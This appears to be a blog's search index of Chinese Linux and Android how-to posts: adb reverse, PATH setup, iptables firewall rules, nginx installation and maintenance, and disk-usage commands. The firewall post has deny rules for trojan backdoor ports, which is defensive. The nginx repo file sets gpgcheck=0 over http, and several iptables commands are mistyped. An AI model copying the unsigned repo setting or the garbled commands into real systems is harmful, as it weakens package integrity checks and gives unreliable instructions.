<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android上超级好用的前端调试方法（adb-reverse）</title>
    <url>/nirvana/android/android/Android%E4%B8%8A%E8%B6%85%E7%BA%A7%E5%A5%BD%E7%94%A8%E7%9A%84%E5%89%8D%E7%AB%AF%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95%EF%BC%88adb-reverse%EF%BC%89/</url>
    <content><![CDATA[<p>前端开发前端页面，经常需要改两行代码就要看看页面效果。如果是兼容桌面浏览器的页面还好办，在本地启动服务，写两句代码refresh一下就可以看到效果了，但是更多的时候，页面是必须在APP中加载，用到APP提供的JsApi的，桌面浏览器根本没法使用页面的功能。</p>
<p>android手机可硬使用adb reverse，终端中输入执行一下adb，列出的帮助文档中，有这样一段：<br><img src="https://upload-images.jianshu.io/upload_images/10024246-f14f2905f7b87eb0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>Android允许我们通过ADB，把Android上的某个端口映射到电脑（adb forward），或者把电脑的某个端口映射到Android系统（adb reverse）。</p>
<p>假设电脑上开启的服务，监听的端口为8000。Android手机通过USB连接电脑后，执行 adb reversetcp:8000 tcp:8000，然后在手机中访问127.0.0.1:8000，就可以访问到电脑上启动的服务了，</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
  </entry>
  <entry>
    <title>Mac-配置-adb</title>
    <url>/nirvana/android/android/Mac-%E9%85%8D%E7%BD%AE-adb/</url>
    <content><![CDATA[<p>第一步：打开终端，进入根目录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$HOME (进入根目录)</span><br></pre></td></tr></table></figure>

<p>第二步：创建 .bash_profile 文件（已存在则无需创建）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch .bash_profile （创建 .bash_profile 文件）</span><br></pre></td></tr></table></figure>
<p>第三步：打开并编辑 .bash_profile 文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open -e .bash_profile （打开编辑 .bash_profile）</span><br></pre></td></tr></table></figure>
<p>在该文件中配置 adb 的路径信息，比如我的（注意替换为你的路径）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export ANDROID_HOME&#x3D;&#x2F;Users&#x2F;mac&#x2F;Library&#x2F;Android&#x2F;sdk</span><br><span class="line">export PATH&#x3D;$PATH:$ANDROID_HOME&#x2F;tools</span><br><span class="line">export PATH&#x3D;$PATH:$ANDROID_HOME&#x2F;platform-tools</span><br></pre></td></tr></table></figure>
<p>第四步：使配置生效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source .bash_profile</span><br></pre></td></tr></table></figure>
<p>到这里， 如果输入 adb 后并没有提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-bash: adb: command not found</span><br></pre></td></tr></table></figure>
<p>就表示已经配置成功了。</p>
<p>但是如果你此时退出终端，然后重新打开终端输入 adb，又提示你：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-bash: adb: command not found</span><br></pre></td></tr></table></figure>
<p>那么你就需要做如下操作了，首先检查你的 shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure>
<p>如果是 base，就把：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure>
<p>追加到 ~/.bashrc 末尾。</p>
<p>如果是 zsh，就把</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure>
<p>追加到 ~/.zshrc 末尾。</p>
<p>如果没有对于的 .bashrc 、.zshrc 文件，那么按照上面对应的命令新建一个即可。<br>这里以 shell 为 base 以及没有 .bashrc 文件为例，贴一下终端代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$HOME</span><br><span class="line">touch .bashrc</span><br><span class="line">open -e .bashrc</span><br></pre></td></tr></table></figure>
<p>将 ~/.bash_profile 保存到刚打开的文件中，重新打开终端</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
  </entry>
  <entry>
    <title>Linux下iptables防火墙配置详解</title>
    <url>/nirvana/linux/linux/Linux%E4%B8%8Biptables%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<ol>
<li>iptables命令及参数介绍<br>iptables常用命令：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A 将一个规则添加到链末尾</span><br><span class="line">iptables -D 将指定的链中删除规则</span><br><span class="line">iptables -F 将指定的链中删除所有规则</span><br><span class="line">iptables -I 将在指定链的指定编号位置插入一个规则</span><br><span class="line">iptables -L 列出指定链中所有规则</span><br><span class="line">iptables -t nat -L 列出所有NAT链中所有规则</span><br><span class="line">iptables -N 建立用户定义链</span><br><span class="line">iptables -X 删除用户定义链</span><br><span class="line">iptables -P 修改链的默认设置，如将iptables -P INPUT DROP (将INPUT链设置为DROP)</span><br></pre></td></tr></table></figure>
常见设置参数介绍：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--dport 指定目标TCP&#x2F;IP端口 如 –dport 80</span><br><span class="line">--sport 指定源TCP&#x2F;IP端口 如 –sport 80</span><br><span class="line">-p tcp 指定协议为tcp</span><br><span class="line">-p icmp 指定协议为ICMP</span><br><span class="line">-p udp 指定协议为UDP</span><br><span class="line">-j DROP 拒绝</span><br><span class="line">-j ACCEPT 允许</span><br><span class="line">-j REJECT 拒绝并向发出消息的计算机发一个消息</span><br><span class="line">-j LOG 在&#x2F;var&#x2F;log&#x2F;messages中登记分组匹配的记录</span><br><span class="line">-m mac –mac 绑定MAC地址</span><br><span class="line">-m limit –limit 1&#x2F;s 1&#x2F;m 设置时间策列</span><br><span class="line">-s 10.10.0.0或10.10.0.0&#x2F;16 指定源地址或地址段</span><br><span class="line">-d 10.10.0.0或10.10.0.0&#x2F;16 指定目标地址或地址段</span><br><span class="line">-s ! 10.10.0.0 指定源地址以外的</span><br></pre></td></tr></table></figure>
iptables配置文件<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置文件位置： &#x2F;etc&#x2F;sysconfig&#x2F;iptables</span><br></pre></td></tr></table></figure>
iptables服务命令</li>
</ol>
<p>– 启动服务</p>
<h1 id="etc-init-d-iptables-start"><a href="#etc-init-d-iptables-start" class="headerlink" title="/etc/init.d/iptables start"></a>/etc/init.d/iptables start</h1><h1 id="service-iptables-start"><a href="#service-iptables-start" class="headerlink" title="service iptables start"></a>service iptables start</h1><p>– 停止服务</p>
<h1 id="etc-init-d-iptables-stop"><a href="#etc-init-d-iptables-stop" class="headerlink" title="/etc/init.d/iptables stop"></a>/etc/init.d/iptables stop</h1><h1 id="service-iptables-stop"><a href="#service-iptables-stop" class="headerlink" title="service iptables stop"></a>service iptables stop</h1><p>– 重启服务</p>
<h1 id="etc-init-d-iptables-restart"><a href="#etc-init-d-iptables-restart" class="headerlink" title="/etc/init.d/iptables restart"></a>/etc/init.d/iptables restart</h1><h1 id="service-iptables-restart"><a href="#service-iptables-restart" class="headerlink" title="service iptables restart"></a>service iptables restart</h1><p>– 保存设置</p>
<h1 id="etc-init-d-iptables-save"><a href="#etc-init-d-iptables-save" class="headerlink" title="/etc/init.d/iptables save"></a>/etc/init.d/iptables save</h1><h1 id="service-iptables-save"><a href="#service-iptables-save" class="headerlink" title="service iptables save"></a>service iptables save</h1><ol start="2">
<li>配置Filter表防火墙<br>查看iptables的配置信息</li>
</ol>
<h1 id="iptables-L-n"><a href="#iptables-L-n" class="headerlink" title="iptables -L -n"></a>iptables -L -n</h1><p>清除原有防火墙规则</p>
<p>清除预设表filter中的所有规则链的规则</p>
<h1 id="iptables-F"><a href="#iptables-F" class="headerlink" title="iptables -F"></a>iptables -F</h1><p>清除预设表filter中使用者自定链中的规则</p>
<h1 id="iptables-X"><a href="#iptables-X" class="headerlink" title="iptables -X"></a>iptables -X</h1><p>保存防火墙设置</p>
<h1 id="etc-init-d-iptables-save-1"><a href="#etc-init-d-iptables-save-1" class="headerlink" title="/etc/init.d/iptables save"></a>/etc/init.d/iptables save</h1><p>或</p>
<h1 id="service-iptables-save-1"><a href="#service-iptables-save-1" class="headerlink" title="service iptables save"></a>service iptables save</h1><p>设定预设规则</p>
<p>– 请求接入包丢弃<br>[root@home ~]# iptables -p INPUT DROP<br>– 接受响应数据包<br>[root@home ~]# iptables -p OUTPUT ACCEPT<br>– 转发数据包丢弃<br>[root@home ~]# iptables -p FORWARD DROP<br>添加防火墙规则</p>
<p>首先添加INPUT链,INPUT链的默认规则是DROP,所以我们就写需要ACCETP(通过)的链。</p>
<p>开启SSH服务端口<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 22 -j ACCEPT<br>注:如果在预设设置把OUTPUT设置成DROP策略的话，就需要设置OUTPUT规则，否则无法进行SSH连接。</p>
<p>开启Web服务端口<br>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 80 -j ACCEPT<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>开启邮件服务的25、110端口<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 110 -j ACCEPT<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 25 -j ACCEPT<br>开启FTP服务的21端口<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 21 -j ACCEPT<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 20 -j ACCEPT<br>开启DNS服务的53端口<br>[root@tp ~]# iptables -A INPUT -p tcp –dport 53 -j ACCEPT<br>设置icmp服务<br>[root@tp ~]# iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话)<br>[root@tp ~]# iptables -A INPUT -p icmp -j ACCEPT    (INPUT设置成DROP的话)<br>允许loopback<br>不然会导致DNS无法正常关闭等问题</p>
<p>[root@tp ~]# IPTABLES -A INPUT -i lo -p all -j ACCEPT<br>(如果是INPUT DROP)<br>[root@tp ~]# IPTABLES -A OUTPUT -o lo -p all -j ACCEPT<br>(如果是OUTPUT DROP)<br>减少不安全的端口连接<br>[root@tp ~]# iptables -A OUTPUT -p tcp –sport 31337 -j DROP<br>[root@tp ~]# iptables -A OUTPUT -p tcp –dport 31337 -j DROP<br>说明：有些特洛伊木马会扫描端口31337到31340(即黑客语言中的 elite 端口)上的服务。既然合法服务都不使用这些非标准端口来通信,阻塞这些端口能够有效地减少你的网络上可能被感染的机器和它们的远程主服务器进行独立通信的机会。此外，其他端口也一样,像:31335、27444、27665、20034 NetBus、9704、137-139（smb）,2049(NFS)端口也应被禁止。</p>
<p>只允许某台主机或某个网段进行SSH连接<br>只允许192.168.0.3的机器进行SSH连接</p>
<p>[root@tp ~]# iptables -A INPUT -s 192.168.0.3 -p tcp –dport 22 -j ACCEPT<br>如果允许或限制一段IP地址可用192.168.0.0/24表示192.168.0.1-255端的所有IP, 24表示子网掩码数。</p>
<p>[root@tp ~]# iptables -A INPUT -s 192.168.0.0/24 -p tcp –dport 22 -j ACCEPT<br>注意：指定某个主机或者某个网段进行SSH连接，需要在iptables配置文件中的-A INPUT -p tcp -m tcp –dport 22 -j ACCEPT<br>删除，因为它表示所有地址都可以登陆.</p>
<p>如果只允许除了192.168.0.3的主机外都能进行SSH连接</p>
<p>[root@tp ~]# iptables -A INPUT -s ! 192.168.0.3 -p tcp –dport 22 -j ACCEPT<br>开启转发功能<br>在做NAT网络配置时,FORWARD默认规则是DROP时,必须开启数据包转发功能</p>
<p>[root@tp ~]# iptables -A FORWARD -i eth0 -o eth1 -m state –state RELATED,ESTABLISHED -j ACCEPT<br>[root@tp ~]# iptables -A FORWARD -i eth1 -o eh0 -j ACCEPT<br>丢弃坏的TCP包<br>[root@tp ~]#iptables -A FORWARD -p TCP ! –syn -m state –state NEW -j DROP<br>处理IP碎片数量，防止DDOS攻击，允许每秒100个<br>[root@tp ~]#iptables -A FORWARD -f -m limit –limit 100/s –limit-burst 100 -j ACCEPT<br>设置ICMP包过滤, 允许每秒1个包, 限制触发条件是10个包<br>[root@tp ~]#iptables -A FORWARD -p icmp -m limit –limit 1/s –limit-burst 10 -j ACCEPT<br>DROP非法连接<br>[root@tp ~]# iptables -A INPUT   -m state –state INVALID -j DROP<br>[root@tp ~]# iptables -A OUTPUT  -m state –state INVALID -j DROP<br>[root@tp ~]# iptables -A FORWARD -m state –state INVALID -j DROP<br>允许所有已经建立的和相关的连接<br>[root@tp ~]# iptables-A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT<br>[root@tp ~]# iptables-A OUTPUT -m state –state ESTABLISHED,RELATED -j ACCEPT<br>[root@tp ~]# /etc/rc.d/init.d/iptables save<br>3. 配置NAT表防火墙<br>查看本机关于NAT的设置情况</p>
<p>[root@tp rc.d]# iptables -t nat -L<br>清除NAT规则</p>
<p>[root@tp ~]# iptables -F -t nat<br>[root@tp ~]# iptables -X -t nat<br>[root@tp ~]# iptables -Z -t nat<br>添加规则</p>
<p>添加基本的NAT地址转换，添加规则时，我们只添加DROP链，因为默认链全是ACCEPT。</p>
<p>防止外网用内网IP欺骗<br>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 10.0.0.0/8 -j DROP<br>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 172.16.0.0/12 -j DROP<br>[root@tp sysconfig]# iptables -t nat -A PREROUTING -i eth0 -s 192.168.0.0/16 -j DROP<br>禁止与211.101.46.253的所有连接<br>[root@tp ~]# iptables -t nat -A PREROUTING -d 211.101.46.253 -j DROP<br>禁用FTP(21)端口<br>[root@tp ~]# iptables -t nat -A PREROUTING -p tcp –dport 21 -j DROP<br>只禁用211.101.46.253地址的FTP连接,其他连接可以进行。</p>
<p>[root@tp ~]# iptables -t nat -A PREROUTING -p tcp –dport 21 -d 211.101.46.253 -j DROP</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>linux下yum安装最新稳定版nginx</title>
    <url>/nirvana/linux/linux/linux%E4%B8%8Byum%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0%E7%A8%B3%E5%AE%9A%E7%89%88nginx/</url>
    <content><![CDATA[<h2 id="摘抄nginx官网文档"><a href="#摘抄nginx官网文档" class="headerlink" title="摘抄nginx官网文档"></a>摘抄nginx官网文档</h2><p>URL：<a href="http://nginx.org/en/linux_packages.html#stable" title="http://nginx.org/en/linux_packages.html#stable">http://nginx.org/en/linux_packages.html#stable</a></p>
<p>To set up the yum repository for RHEL/CentOS, create the file named <code>/etc/yum.repos.d/nginx.repo</code> with the following contents:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[nginx]</span><br><span class="line">name&#x3D;nginx repo</span><br><span class="line">baseurl&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;centos&#x2F;7&#x2F;$basearch&#x2F;</span><br><span class="line">gpgcheck&#x3D;0 </span><br><span class="line">enabled&#x3D;1</span><br></pre></td></tr></table></figure>

<p>Replace “<code>OS</code>” with “<code>rhel</code>” or “<code>centos</code>”, depending on the distribution used, and “<code>OSRELEASE</code>” with “<code>6</code>” or “<code>7</code>”, for 6.x or 7.x versions, respectively.</p>
<p>执行如下命令进行yum安装nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure>

<p>查看nginx版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看nginx版本</span><br><span class="line">nginx -v</span><br><span class="line"></span><br><span class="line"># 查看编译参数</span><br><span class="line">nginx -V&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>
<p> 查看安装目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -ql nginx</span><br></pre></td></tr></table></figure>

<p>查看配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 用于日志切割</span><br><span class="line"> &#x2F;etc&#x2F;logrotate.d&#x2F;nginx</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>linux 查看磁盘空间占用情况</title>
    <url>/nirvana/linux/linux/linux-%E6%9F%A5%E7%9C%8B%E6%95%B4%E4%B8%AA%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%90%84%E4%B8%AA%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<p>服务器运行一点时间后各种的项目文件，日志文件，数据库备份登，会越来越多，在linux下不像是win下一样直接右键属性可以查看，那么怎么看呢？  用到的命令 du 和 df 命令。</p>
<p>先上代码：</p>
<ol>
<li>    df -h 命令查看磁盘空间<br><img src="https://upload-images.jianshu.io/upload_images/10024246-7ce57bd365e173f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ol>
<ol start="2">
<li>  du -ah –max-depth=1  /    查看根目录下各个文件占用情况<br><img src="https://upload-images.jianshu.io/upload_images/10024246-c3a3064e29607710.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ol>
<p>max-depth表示目录的深度。</p>
<ol start="2">
<li>查看某个目录   du -bsh 命令看一下常用的usr目录大小</li>
</ol>
<p>    du -bsh 可以看到uer 目录占用了2.8G<br><img src="https://upload-images.jianshu.io/upload_images/10024246-165d469d572f959c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ol start="3">
<li> 进入usr目录用find 命令找到大于100M文件   find . -size +100M <br>    可以看到 小写的m不识别</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-704e938a03244f0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>二、du常用的选项：<br>　　-h：以人类可读的方式显示<br>　　-a：显示目录占用的磁盘空间大小，还要显示其下目录和文件占用磁盘空间的大小<br>　　-s：显示目录占用的磁盘空间大小，不要显示其下子目录和文件占用的磁盘空间大小<br>　　-c：显示几个目录或文件占用的磁盘空间大小，还要统计它们的总和<br>　　–apparent-size：显示目录或文件自身的大小<br>　　-l ：统计硬链接占用磁盘空间的大小<br>　　-L：统计符号链接所指向的文件占用的磁盘空间大小</p>
<p>du -sh : 查看当前目录总共占的容量。而不单独列出各子项占用的容量 </p>
<p>du -lh –max-depth=1 : 查看当前目录下一级子文件和子目录占用的磁盘容量。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>linux版本：CentOS7 64位</title>
    <url>/nirvana/linux/linux/linux%E4%B8%8B%E5%AE%89%E8%A3%85nginx/</url>
    <content><![CDATA[<p>【yum 安装最新版nginx：<a href="https://www.jianshu.com/p/a2de35ee5283">https://www.jianshu.com/p/a2de35ee5283</a>】</p>
<p>在安装nginx前首先要确认系统中安装了<code>**gcc、pcre-devel、zlib-devel、openssl-devel**</code>。</p>
<p>Linux下检查是否安装过某软件包：<a href="https://www.jianshu.com/p/356c2d9deff1">https://www.jianshu.com/p/356c2d9deff1</a></p>
<p>安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install gcc pcre-devel zlib-devel openssl openssl-devel</span><br></pre></td></tr></table></figure>

<p>nginx下载地址：<a href="https://nginx.org/download/">https://nginx.org/download/</a></p>
<p>下载“nginx-1.18.0.tar.gz”，移动到/usr/local/下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## 解压</span><br><span class="line">tar -zxvf nginx-1.18.0.tar.gz</span><br><span class="line"></span><br><span class="line">##进入nginx目录</span><br><span class="line">cd nginx-1.18.0</span><br><span class="line">## 配置</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx</span><br><span class="line"># make</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>OK，现在可以执行make 了。 </p>
<p>   <img src="https://upload-images.jianshu.io/upload_images/10024246-e43e02b3dca9408f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>执行make、make install命令</p>
<p>测试是否安装成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd到刚才配置的安装目录</span><br><span class="line">&#x2F;usr&#x2F;loca&#x2F;nginx&#x2F;</span><br><span class="line">.&#x2F;sbin&#x2F;nginx -t</span><br></pre></td></tr></table></figure>

<p><code>**错误信息**</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx: [alert] could not open error log file: open() &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;error.log&quot; failed (2: No such file or directory)</span><br><span class="line">2016&#x2F;09&#x2F;13 19:08:56 [emerg] 6996#0: open() &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;access.log&quot; failed (2: No such file or directory)</span><br></pre></td></tr></table></figure>
<p>原因分析：nginx/目录下没有logs文件夹</p>
<p><code>**解决方法**</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir logs</span><br><span class="line">chmod 700 logs</span><br></pre></td></tr></table></figure>

<p>正常情况的信息输出：</p>
<p>nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok<br>nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</p>
<p>启动nginx </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin</span><br><span class="line">.&#x2F;nginx &#x2F;&#x2F;启动nginx</span><br></pre></td></tr></table></figure>

<p>在浏览器中输入服务器的ip地址，如：<a href="http://localhost/">http://localhost</a></p>
<p>##问题排查：<br>服务器的80端口是打不开的。</p>
<p>因为我使用的linux系统版本是CentOS7，所以可以在服务器中执行如下命令来验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firewall-cmd --query-port&#x3D;80&#x2F;tcp</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-fd24ff6c7af0da76.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>显然80端口没有开启。</p>
<p>下面我们开启80端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firewall-cmd --add-port&#x3D;80&#x2F;tcp --permanent</span><br><span class="line">#重启防火墙</span><br><span class="line">systemctl restart firewalld&lt;&#x2F;pre&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> –permanent   #永久生效，没有此参数重启后失效<br>   <img src="https://upload-images.jianshu.io/upload_images/10024246-ac48aec75fe6b5c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>刷新浏览器</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-3209134f65b0a8f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>====================== 分割线 ====================</strong></p>
<p>配置完毕！</p>
<p>2、配置nginx开机自启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;rc.d&#x2F;rc.local&lt;&#x2F;pre&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-475fc49e832b0290.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>linux下检查是否安装过某软件包</title>
    <url>/nirvana/linux/linux/linux%E4%B8%8B%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AE%89%E8%A3%85%E8%BF%87%E6%9F%90%E8%BD%AF%E4%BB%B6%E5%8C%85/</url>
    <content><![CDATA[<p>1、rpm包安装的，可以用 rpm -qa 看到，如果要查找某软件包是否安装，用** rpm -qa | grep “软件或者包的名字”**</p>
<p>2、以deb包安装的，可以用 dpkg -l 看到。如果是查找指定软件包，用 <strong>dpkg -l | grep “软件或者包的名字”</strong></p>
<p>3、yum方法安装的，可以用 yum list installed 查找，如果是查找指定包，用 <strong>yum list installed | grep “软件名或者包名”</strong></p>
<p><strong>举例：查看是否安装了gcc</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum list installed | grep &quot;gcc&quot;</span><br></pre></td></tr></table></figure>
<p>安装gcc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install gcc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>nginx日常维护常用命令</title>
    <url>/nirvana/linux/linux/nginx%E6%97%A5%E5%B8%B8%E7%BB%B4%E6%8A%A4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>这篇文章主要介绍了nginx日常维护如nginx启动、重启、关闭等常用命令,需要的朋友可以参考下</p>
<h2 id="一、简明nginx常用命令"><a href="#一、简明nginx常用命令" class="headerlink" title="一、简明nginx常用命令"></a><strong>一、简明nginx常用命令</strong></h2><h5 id="1-启动-Nginx"><a href="#1-启动-Nginx" class="headerlink" title="1. 启动 Nginx"></a>1. 启动 Nginx</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:sudo .&#x2F;sbin&#x2F;nginx</span><br></pre></td></tr></table></figure>
<h5 id="2-停止-Nginx"><a href="#2-停止-Nginx" class="headerlink" title="2. 停止 Nginx"></a>2. 停止 Nginx</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:sudo .&#x2F;sbin&#x2F;nginx -s stop</span><br><span class="line">@ubuntu:sudo .&#x2F;sbin&#x2F;nginx -s quit</span><br></pre></td></tr></table></figure>
<p>-s都是采用向 Nginx 发送信号的方式。</p>
<h5 id="3-Nginx-重载配置"><a href="#3-Nginx-重载配置" class="headerlink" title="3. Nginx 重载配置"></a>3. Nginx 重载配置</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:sudo .&#x2F;sbin&#x2F;nginx -s reload</span><br></pre></td></tr></table></figure>
<p>上述是采用向 Nginx 发送信号的方式，或者使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:service nginx reload</span><br></pre></td></tr></table></figure>
<h5 id="4-指定配置文件"><a href="#4-指定配置文件" class="headerlink" title="4. 指定配置文件"></a>4. 指定配置文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:sudo .&#x2F;sbin&#x2F;nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
<p>-c表示configuration，指定配置文件。</p>
<h5 id="5-查看-Nginx-版本"><a href="#5-查看-Nginx-版本" class="headerlink" title="5. 查看 Nginx 版本"></a>5. 查看 Nginx 版本</h5><p>有两种可以查看 Nginx 的版本信息的参数。第一种如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:&#x2F;usr&#x2F;local&#x2F;nginx$ .&#x2F;sbin&#x2F;nginx -v</span><br><span class="line">nginx: nginx version: nginx&#x2F;1.0.0</span><br></pre></td></tr></table></figure>
<p>另一种显示的是详细的版本信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:&#x2F;usr&#x2F;local&#x2F;nginx$ .&#x2F;sbin&#x2F;nginx -V</span><br><span class="line">nginx: nginx version: nginx&#x2F;1.0.0</span><br><span class="line">nginx: built by gcc 4.3.3 (Ubuntu 4.3.3-5ubuntu4) </span><br><span class="line">nginx: TLS SNI support enabled</span><br><span class="line">nginx: configure arguments: --with-http_ssl_module --with-openssl&#x3D;&#x2F;home&#x2F;luming&#x2F;openssl-1.0.0d&#x2F;</span><br></pre></td></tr></table></figure>
<h5 id="6-检查配置文件是否正确"><a href="#6-检查配置文件是否正确" class="headerlink" title="6. 检查配置文件是否正确"></a>6. 检查配置文件是否正确</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ubuntu:&#x2F;usr&#x2F;local&#x2F;nginx$ .&#x2F;sbin&#x2F;nginx -t</span><br><span class="line">nginx: [alert] could not open error log file: open() &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;error.log&quot; failed (13: Permission denied)</span><br><span class="line">nginx: the configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf syntax is ok</span><br><span class="line">2012&#x2F;01&#x2F;09 16:45:09 [emerg] 23898#0: open() &quot;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs&#x2F;nginx.pid&quot; failed (13: Permission denied)</span><br><span class="line">nginx: configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf test failed</span><br></pre></td></tr></table></figure>
<p>如果出现如上的提示信息，表示没有访问错误日志文件和进程，可以sudo（super user do）一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">poerchant@ubuntu:&#x2F;usr&#x2F;local&#x2F;nginx$ sudo .&#x2F;sbin&#x2F;nginx -t</span><br><span class="line">nginx: the configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf test is successful</span><br></pre></td></tr></table></figure>
<p>如果显示如上，则表示配置文件正确。否则，会有相关提示。</p>
